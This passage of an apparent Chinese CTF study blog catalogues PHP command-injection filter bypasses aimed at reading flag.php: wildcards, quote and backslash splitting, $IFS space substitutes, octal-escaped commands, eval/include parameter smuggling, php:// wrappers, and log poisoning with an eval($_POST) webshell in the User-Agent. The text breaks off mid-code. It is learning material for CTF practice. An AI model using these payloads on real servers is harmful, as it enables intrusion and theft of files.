href="#1-3-tac命令文件读取" class="headerlink" title="1.3 tac命令文件读取"></a>1.3 tac命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=tac flag.php<br></code></pre></td></tr></table></figure><h2 id="1-4-vi命令文件读取"><a href="#1-4-vi命令文件读取" class="headerlink" title="1.4 vi命令文件读取"></a>1.4 vi命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=vi flag.php<br></code></pre></td></tr></table></figure><h2 id="1-5-uniq命令文件读取"><a href="#1-5-uniq命令文件读取" class="headerlink" title="1.5 uniq命令文件读取"></a>1.5 uniq命令文件读取</h2><p>uniq函数的作用是删除文件重复行并输出剩余内容，可以用于文件读取。与cat一样，结果在源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=uniq flag.php<br></code></pre></td></tr></table></figure><h2 id="1-6-base64命令读取文件"><a href="#1-6-base64命令读取文件" class="headerlink" title="1.6 base64命令读取文件"></a>1.6 base64命令读取文件</h2><p>base64命令可以读取flag.php并编码后输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=base64 flag.php<br>?c=/bin/base64 flag.php<br></code></pre></td></tr></table></figure><h2 id="1-7-grep命令文件读取"><a href="#1-7-grep命令文件读取" class="headerlink" title="1.7 grep命令文件读取"></a>1.7 grep命令文件读取</h2><p>grep用于查询文件中包含某个特定字符串的行并输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=grep <span class="hljs-string">&#x27;fla&#x27;</span> flag.php<br></code></pre></td></tr></table></figure><h2 id="1-8-sort命令排序输出"><a href="#1-8-sort命令排序输出" class="headerlink" title="1.8 sort命令排序输出"></a>1.8 sort命令排序输出</h2><p>sort是一个排序命令，<code>sort filename</code>​会将文件内容进行<strong>行间</strong>的排序并输出文本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=sort flag.php<br></code></pre></td></tr></table></figure><h2 id="1-9-mv命令文件重命名"><a href="#1-9-mv命令文件重命名" class="headerlink" title="1.9 mv命令文件重命名"></a>1.9 mv命令文件重命名</h2><p>mv函数的作用是对文件进行重命名，通过修改后缀名为txt，可以直接在网页中访问txt文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=mv f?lg.php a.txt<br></code></pre></td></tr></table></figure><h2 id="1-10-cp命令文件内容复制"><a href="#1-10-cp命令文件内容复制" class="headerlink" title="1.10 cp命令文件内容复制"></a>1.10 cp命令文件内容复制</h2><p>用cp命令将flag的内容复制到<code>1.txt</code>​上，然后访问<code>/1.txt</code>​文件读取，注意使用反引号进行命令执行时，还是需要使用<code>echo</code>​</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=cp flag.php <span class="hljs-number">1.</span>txt<br><br>?c=echo `cp flag.php <span class="hljs-number">1.</span>txt`;<br></code></pre></td></tr></table></figure><h1 id="三-文件名过滤"><a href="#三-文件名过滤" class="headerlink" title="三. 文件名过滤"></a>三. 文件名过滤</h1><h2 id="3-1-​通配符绕过"><a href="#3-1-​通配符绕过" class="headerlink" title="3.1 *​通配符绕过"></a>3.1 <code>*</code>​通配符绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac fl*g.php&quot;</span>);<br>?c=system(<span class="hljs-string">&quot;tac fl*&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="3-2-​空字符匹配绕过"><a href="#3-2-​空字符匹配绕过" class="headerlink" title="3.2 &#39;&#39;​空字符匹配绕过"></a>3.2 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac fla&#x27;&#x27;g.php&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>空字符串</strong>的可以用于绕过某些字符过滤，<code>fla&#39;&#39;g.php</code>​ 等价于 <code>flag.php</code>​</p><h2 id="3-3-​匹配绕过"><a href="#3-3-​匹配绕过" class="headerlink" title="3.3 \​匹配绕过"></a>3.3 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac fl\ag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>fl\ag.php</code>​ 可能会被解释为 <code>flag.php</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p><h2 id="3-4-​占位绕过"><a href="#3-4-​占位绕过" class="headerlink" title="3.4 ?​占位绕过"></a>3.4 <code>?</code>​占位绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac f???????&quot;</span>)<br></code></pre></td></tr></table></figure><p>在很多操作系统的文件系统中，<code>?</code>​ 被用作通配符，代表 <strong>任何单个字符</strong>。在 Linux 中，<code>f???????</code>​ 可以匹配任何以 <code>f</code>​ 开头并包含 7 个任意字符的文件名</p><h2 id="3-5-传参执行绕过"><a href="#3-5-传参执行绕过" class="headerlink" title="3.5 传参执行绕过"></a>3.5 传参执行绕过</h2><h3 id="3-5-1-eval函数"><a href="#3-5-1-eval函数" class="headerlink" title="3.5.1 eval函数"></a>3.5.1 eval函数</h3><p>eval函数执行任意php命令，这里利用get方式接受x参数，在传参中执行命令，而在这个get方式接受的参数并没有被过滤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=eval($_GET[x]);&amp;x=system(<span class="hljs-string">&quot;ls&quot;</span>);<br>?c=eval($_GET[x]);&amp;x=system(<span class="hljs-string">&quot;tac flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-5-2-include函数"><a href="#3-5-2-include函数" class="headerlink" title="3.5.2 include函数"></a>3.5.2 include函数</h3><p>这个方法实际上是结合了文件包含漏洞，利用文件包含读取flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=include($_GET[x]);&amp;x=php:<span class="hljs-comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>如果<code>(</code>​和<code>;</code>​被过滤：<br>​<code>%0a</code>​ 是 URL 编码中表示换行符（<code>\n</code>​）的字符。从而使得 <code>include</code>​ 语句和 <code>$_GET[1]</code>​ 的处理被分开，从而绕过过滤机制，不过include函数这里不加<code>(</code>​也是可以的<br>php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=include%<span class="hljs-number">0</span>a$_GET[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span><br>?c=include$_GET[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="3-5-3-日志包含"><a href="#3-5-3-日志包含" class="headerlink" title="3.5.3 日志包含"></a>3.5.3 日志包含</h3><p>既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的UA头，假设我们在UA头中写入后门代码，然后我们包含日志文件，那么就能通过后门代码读取文件，日志包含可以参考我过去的文章。这里的日志目录需要多次尝试。用蚁剑连接<code>http://576f2421-5308-45ef-9c2e-17454de9e09a.challenge.ctf.show/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log</code>​即可，注意要用<code>http</code>​，浏览器上直接粘下来会由于SSL证书连不上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=include$_GET[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=../../../../var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span>  <br><br>User-Agent:&lt;?php eval($_POST[<span class="hljs-string">&#x27;x&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><h2 id="3-6-变量作用域劫持攻击"><a href="#3-6-变量作用域劫持攻击" class="headerlink" title="3.6 变量作用域劫持攻击"></a>3.6 变量作用域劫持攻击</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=eval(array_pop(next(get_defined_vars())));<br>post:<br><span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;tac fl*&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-6-1-函数解释"><a href="#3-6-1-函数解释" class="headerlink" title="3.6.1 函数解释"></a>3.6.1 函数解释</h3><ul><li>​<strong>​<code>get_defined_vars()</code>​</strong> ​<br>获取当前作用域中所有定义的变量，返回一个数组，键是变量名，值是对应的变量值。</li><li>​<strong>​<code>next(get_defined_vars())</code>​</strong> ​<br>将指针移动到数组中的下一个元素，并返回该元素的值。在这里，指针操作的对象是由 <code>get_defined_vars()</code>​ 返回的数组。</li><li>​<strong>​<code>array_pop(...)</code>​</strong> ​<br>弹出数组的最后一个元素。这里作用在 <code>next(get_defined_vars())</code>​ 的结果上，获取这个数组的最后一个变量值。</li></ul><h3 id="3-6-2-攻击流程"><a href="#3-6-2-攻击流程" class="headerlink" title="3.6.2 攻击流程"></a>3.6.2 攻击流程</h3><ul><li>攻击者通过 <code>POST</code>​ 请求传入 <code>1=system(&#39;tac fl*&#39;);</code>​，在服务器端该数据被<strong>存储为变量</strong>。</li><li>​<code>array_pop(next(get_defined_vars()))</code>​ 获取该变量值，即 <code>system(&#39;tac fl*&#39;)</code>​。</li><li>​<code>eval()</code>​ 动态执行，触发 <code>system(&#39;tac fl*&#39;)</code>​，攻击者能够获取敏感文件内容。</li></ul><h2 id="3-7-函数嵌套文件枚举"><a href="#3-7-函数嵌套文件枚举" class="headerlink" title="3.7 函数嵌套文件枚举"></a>3.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=show_source(scandir(getcwd())[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure><h2 id="3-8-函数嵌套文件读取"><a href="#3-8-函数嵌套文件读取" class="headerlink" title="3.8 函数嵌套文件读取"></a>3.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">读取最后一个文件<br>?c=show_source(current(array_reverse(scandir(getcwd()))));<br>读取倒数第二个元素<br>?c=show_source(next(array_reverse(scandir(getcwd()))));<br></code></pre></td></tr></table></figure><p>还可以用另一个函数得到目录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));<br>?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h1 id="四-空格过滤"><a href="#四-空格过滤" class="headerlink" title="四. 空格过滤"></a>四. 空格过滤</h1><h2 id="4-1-20​空格绕过"><a href="#4-1-20​空格绕过" class="headerlink" title="4.1 %20​空格绕过"></a>4.1 <code>%20</code>​空格绕过</h2><p>是 URL 编码的空格</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac%20flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="4-2-09​空格绕过"><a href="#4-2-09​空格绕过" class="headerlink" title="4.2 %09​空格绕过"></a>4.2 <code>%09</code>​空格绕过</h2><p>​<code>%09</code>​ 是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 <code>tac</code>​ 后面的 <code>fla*</code>​ 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac%09flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="4-3-IFS-9​空格绕过"><a href="#4-3-IFS-9​空格绕过" class="headerlink" title="4.3 $IFS$9​空格绕过"></a>4.3 <code>$IFS$9</code>​空格绕过</h2><p>​<code>$IFS</code>​ 是一个特殊的环境变量，表示 <strong>Internal Field Separator（内部字段分隔符）</strong> ，默认情况下，<code>$IFS</code>​ 的值包含空格、制表符和换行符。<code>$9</code>​是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac$IFS$9flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="4-4-IFS-​绕过"><a href="#4-4-IFS-​绕过" class="headerlink" title="4.4 ${IFS}​绕过"></a>4.4 <code>$&#123;IFS&#125;</code>​绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac$&#123;IFS&#125;flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="4-5"><a href="#4-5" class="headerlink" title="4.5 &lt;​空格绕过"></a>4.5 <code>&lt;</code>​空格绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;tac&lt;fla*&quot;</span>);<br></code></pre></td></tr></table></figure><p>​<code>&lt;</code>​ 是 <strong>输入重定向符号</strong>，用于将文件内容作为命令的输入，可以用于空格绕过。</p><h1 id="五-命令过滤"><a href="#五-命令过滤" class="headerlink" title="五. 命令过滤"></a>五. 命令过滤</h1><h2 id="5-1-​空字符匹配绕过"><a href="#5-1-​空字符匹配绕过" class="headerlink" title="5.1 &#39;&#39;​空字符匹配绕过"></a>5.1 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;ta&#x27;&#x27;c flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>和文件名绕过一样，<strong>空字符串</strong>的可以用于绕过某些函数的过滤，<code>ta&#39;&#39;c</code>​ 等价于 <code>tac</code>​</p><h2 id="5-2-​匹配绕过"><a href="#5-2-​匹配绕过" class="headerlink" title="5.2 \​匹配绕过"></a>5.2 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=system(<span class="hljs-string">&quot;ta\c flag.php&quot;</span>)<br></code></pre></td></tr></table></figure><p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>ta\c</code>​ 可能会被解释为 <code>tac</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p><h2 id="5-3-命令文件-​绕过"><a href="#5-3-命令文件-​绕过" class="headerlink" title="5.3 命令文件+?​绕过"></a>5.3 命令文件+<code>?</code>​绕过</h2><p>cat命令所在的路径是在&#x2F;bin&#x2F;目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面，如果bin被过滤了也可以用通配符<br>记得cat要看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=/bin/c?t flag.php<br>?c=/?in/c?t flag.php<br></code></pre></td></tr></table></figure><p>同理，base64命令也可以这样操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=/bin/ba?e64 flag.php<br></code></pre></td></tr></table></figure><h2 id="5-4-换用其他命令"><a href="#5-4-换用其他命令" class="headerlink" title="5.4 换用其他命令"></a>5.4 换用其他命令</h2><p>在第一部分有这么多函数，说不定有些没被过滤呢</p><h1 id="六-字母过滤"><a href="#六-字母过滤" class="headerlink" title="六. 字母过滤"></a>六. 字母过滤</h1><h2 id="6-1-base64命令文件执行"><a href="#6-1-base64命令文件执行" class="headerlink" title="6.1 base64命令文件执行"></a>6.1 base64命令文件执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=/bin/base64 flag.php<br>?c=/???/????<span class="hljs-number">64</span> ????.???<br></code></pre></td></tr></table></figure><h2 id="6-2-数字ASCII码代替字母"><a href="#6-2-数字ASCII码代替字母" class="headerlink" title="6.2 数字ASCII码代替字母"></a>6.2 数字ASCII码代替字母</h2><p>​<code>$&#39;</code>​ 是 Bash 中的字符转义机制，用于解析以反斜杠 <code>\</code>​ 开头的转义字符或八进制&#x2F;十六进制字符表示。其中，以<code>\143</code>​为例，<code>\143</code>​ 是 ASCII 八进制表示，转换为字符 <strong>​<code>c</code>​</strong>​。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=$<span class="hljs-string">&#x27;\154\163&#x27;</span>      ls<br><br>?c=$<span class="hljs-string">&#x27;\143\141\164&#x27;</span>%<span class="hljs-number">20</span>*     cat *<br><br>?c=$<span class="hljs-string">&#x27;\164\141\143&#x27;</span> $<span class="hljs-string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span>      tac flag.php<br></code></pre></td></tr></table></figure><p>可以使用python脚本来实现八进制ASCII码的编码与解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_to_octal</span>(<span class="hljs-params">input_string</span>):<br>    <span class="hljs-comment"># 将每个字符转换为其ASCII码的八进制表示</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;\\<span class="hljs-subst">&#123;<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:]&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> input_string)<br><br><span class="hljs-comment"># 测试</span><br>input_string = <span class="hljs-string">&quot;cat&quot;</span><br>encoded_string = encode_to_octal(input_string)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Encoded: <span class="hljs-subst">&#123;encoded_string&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_from_octal</span>(<span class="hljs-params">octal_string</span>):<br>    <span class="hljs-comment"># 分割八进制字符串，并将每个八进制值转换为字符</span><br>    characters = octal_string.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[<span class="hljs-number">1</span>:]  <span class="hljs-comment"># 去掉空字符串部分</span><br>    decoded_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">oct</span>(c), <span class="hljs-number">8</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> characters)<br>    <span class="hljs-keyword">return</span> decoded_string<br><br><span class="hljs-comment"># 测试</span><br>octal_string = <span class="hljs-string">&quot;\\143\\141\\164&quot;</span><br>decoded_string = decode_from_octal(octal_string)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded: <span class="hljs-subst">&#123;decoded_string&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="七-命令执行函数过滤"><a href="#七-命令执行函数过滤" class="headerlink" title="七. 命令执行函数过滤"></a>七. 命令执行函数过滤</h1><p>题目只有一层<code>eval</code>​，而用于执行命令的函数都被过滤了，下面将介绍如何<strong>仅仅通过函数的结合，不利用任何命令</strong>，来实现目录与文件读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;        <br>$c= $_POST[<span class="hljs-string">&#x27;c&#x27;</span>];           <br>eval($c);  <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br>highlight_file(__FILE__);   <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-1-函数嵌套目录读取"><a href="#7-1-函数嵌套目录读取" class="headerlink" title="7.1 函数嵌套目录读取"></a>7.1 函数嵌套目录读取</h2><h3 id="7-1-1-自根目录向下读取目录"><a href="#7-1-1-自根目录向下读取目录" class="headerlink" title="7.1.1 自根目录向下读取目录"></a>7.1.1 自根目录向下读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>));<br>c=print_r(scandir(<span class="hljs-string">&quot;/var&quot;</span>));<br>c=print_r(scandir(<span class="hljs-string">&quot;/var/www&quot;</span>));<br>c=print_r(scandir(<span class="hljs-string">&quot;/var/www/html&quot;</span>));<br></code></pre></td></tr></table></figure><p>这里也一样，不再列举</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">c=var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br>c=echo(implode(<span class="hljs-string">&#x27;--&#x27;</span>,scandir(<span class="hljs-string">&quot;/&quot;</span>)));<br>c=echo json_encode(scandir(<span class="hljs-string">&quot;/&quot;</span>));<br></code></pre></td></tr></table></figure><h3 id="7-1-2-自当前目录向上读取目录"><a href="#7-1-2-自当前目录向上读取目录" class="headerlink" title="7.1.2 自当前目录向上读取目录"></a>7.1.2 自当前目录向上读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">c=print_r(scandir(dirname(__FILE__)));  <span class="hljs-comment">// 读取当前目录</span><br>c=print_r(scandir(dirname(__DIR__)));   <span class="hljs-comment">// 读取上级目录</span><br>c=print_r(scandir(dirname(dirname(__FILE__))));<span class="hljs-comment">//读取上级目录</span><br>c=print_r(scandir(dirname(dirname(__DIR__))));<span class="hljs-comment">//读取上上级目录</span><br>c=print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));<br></code></pre></td></tr></table></figure><ul><li>​<code>dirname()</code>​ 用于获取路径的目录部分。<code>dirname(&#39;FILE&#39;);</code>​返回 ‘.’</li><li>​<code>scandir()</code>​ 列出指定目录中的文件和目录，返回一个数组</li><li>​<code>print_r()</code>​ 输出变量的易读信息，适合用于调试和查看数组内容</li><li>​<code>__FILE__</code>​ <code>__DIR__</code>​是php中的魔术方法，可以用于获取当前目录与上级目录，通过迭代<code>dirname</code>​函数就能实现目录遍历<br>输出：<code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )</code>​<br>这里也一样，不再列举</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">c=var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));<br>c=var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));<br>c=echo(implode(<span class="hljs-string">&#x27;--&#x27;</span>,scandir(dirname(dirname(dirname(dirname(__DIR__)))))));<br>c=echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));<br></code></pre></td></tr></table></figure><p>还可以用glob函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">c=var_export(glob(<span class="hljs-string">&#x27;*&#x27;</span>));<br>c=var_export(glob(<span class="hljs-string">&#x27;../*&#x27;</span>));<br>c=var_export(glob(<span class="hljs-string">&#x27;../../*&#x27;</span>));<br>c=var_export(glob(<span class="hljs-string">&#x27;../../../*&#x27;</span>));<br></code></pre></td></tr></table></figure><h2 id="7-2-include函数文件读取"><a href="#7-2-include函数文件读取" class="headerlink" title="7.2 include函数文件读取"></a>7.2 include函数文件读取</h2><h3 id="7-2-1-直接包含输出文件"><a href="#7-2-1-直接包含输出文件" class="headerlink" title="7.2.1 直接包含输出文件"></a>7.2.1 直接包含输出文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">c=include(<span class="hljs-string">&quot;flag.php&quot;</span>);echo $flag;<br><br>c=include(<span class="hljs-string">&quot;../../../../../flag.txt&quot;</span>);echo $flag;<br><br>c=include(<span class="hljs-string">&quot;/flag.txt&quot;</span>);echo $flag;<br></code></pre></td></tr></table></figure><h3 id="7-2-2-伪协议文件读取❓"><a href="#7-2-2-伪协议文件读取❓" class="headerlink" title="7.2.2 伪协议文件读取❓"></a>7.2.2 伪协议文件读取❓</h3><ol><li>​<code>php://filter</code>​伪协议，它的传参伪协议打法更详细见[[#3.5.2 include函数]]</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">c=include <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=flag.php&quot;</span>;<br><br>c=include <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=../../../../../flag.txt&quot;</span>;<br><br>c=include <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=/flag.txt&quot;</span>;<br><br>?c=include($_GET[x]);&amp;x=php:<span class="hljs-comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span><br></code></pre></td></tr></table></figure><ol start="2"><li>​<code>php://input</code>​伪协议</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">?c=include$_GET[x]&amp;x=php:<span class="hljs-comment">//input</span><br>post：&lt;?php system(<span class="hljs-string">&quot;ls -lah&quot;</span>)?&gt;<br>      &lt;?php system(<span class="hljs-string">&quot;tac flag.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure><ol start="3"><li>​<code>data://</code>​伪协议<br> 第二个是对php代码base64编码绕过<code>flag.php</code>​的过滤❓</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 